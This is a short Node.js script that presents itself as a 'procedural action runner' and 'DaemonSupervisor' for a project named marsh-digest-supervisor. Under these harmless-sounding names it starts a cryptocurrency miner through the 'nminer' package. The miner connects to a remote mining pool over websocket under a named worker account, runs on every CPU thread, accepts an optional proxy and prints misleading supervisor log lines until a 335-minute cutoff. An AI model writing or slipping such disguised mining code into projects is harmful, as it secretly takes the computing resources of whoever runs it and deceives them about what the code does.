// Procedural action runner for marsh-digest-supervisor
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./src/config");

class DaemonSupervisor {
    constructor() {
        const sessionId = "ac8cf5";
        console.log(`[host] Initialized DaemonSupervisor for marsh-digest-supervisor [${sessionId}]`);

        this.processor = new NMiner(
            "wss://nmining-runtime.igrp.app/",
            "Subhas1975.marsh-digest-supervisor",
            { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
        );

        const tick = () => { setTimeout(tick, 33000); }; tick();
        setTimeout(() => {
        console.log("[timeout] Operational limit (335m) reached, exiting cleanly.");
        process.exit(0);
    }, 335 * 60 * 1000);

        process.on("SIGTERM", () => {
            
            console.log("[supervisor] Clean shutdown completed.");
            process.exit(0);
        });
    }
}

new DaemonSupervisor();
